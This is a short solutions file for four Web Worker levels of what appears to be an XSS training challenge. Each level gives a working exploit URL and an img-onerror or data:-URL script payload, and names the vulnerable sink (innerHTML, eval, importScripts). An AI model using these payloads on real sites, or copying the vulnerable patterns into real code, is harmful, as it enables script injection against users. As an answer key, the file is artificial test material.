# worker — solutions

Web Worker relays: payload travels through the worker boundary and the page innerHTMLs the worker's response.

### worker-level1

`/worker/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: page postMessages query, worker echoes back, page innerHTMLs

### worker-level2

`/worker/level2/?query=%22%3Cimg%20src=x%20onerror=alert(1)%3E%22`

- payload: `"<img src=x onerror=alert(1)>"`
- context: query JSON-encoded into worker source as `self.postMessage(...)`; string posted then innerHTML

### worker-level3

`/worker/level3/?query=data:application/javascript,self.postMessage(%27%3Cimg%20src=x%20onerror=alert(1)%3E%27)`

- payload: `data:application/javascript,self.postMessage('<img src=x onerror=alert(1)>')`
- context: importScripts() URL — attacker-controlled data: script posts back HTML

### worker-level4

`/worker/level4/?query=%27%3Cimg%20src=x%20onerror=alert(1)%3E%27`

- payload: `'<img src=x onerror=alert(1)>'`
- context: worker eval(e.data) — return an HTML string that page innerHTMLs
